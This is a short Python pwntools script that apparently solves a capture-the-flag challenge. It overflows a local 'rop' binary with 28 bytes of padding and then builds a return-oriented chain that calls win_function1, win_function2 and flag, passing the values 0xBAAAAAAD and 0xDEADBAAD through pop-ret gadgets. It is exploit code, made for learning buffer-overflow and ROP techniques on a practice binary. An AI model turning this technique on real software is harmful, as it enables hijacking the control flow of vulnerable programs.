from pwn import *
import struct

sh = process("./rop")

proc = ELF('./rop')

raw_input()
pop_ret = 0x0804840d
addr_win1 = int(hex(proc.symbols['win_function1']),16)
print(type(addr_win1))
addr_win2 = int(hex(proc.symbols['win_function2']), 16)
addr_flag = int(hex(proc.symbols['flag']), 16)
addr_main = int(hex(proc.symbols['main']), 16)


payload = "A"*28
payload += p32(addr_win1)
payload += p32(addr_win2)
payload += p32(pop_ret)
payload += p32(0xBAAAAAAD)
payload += p32(addr_flag)
payload += p32(pop_ret)
payload += p32(0xDEADBAAD)

sh.sendline(payload)
sh.interactive()
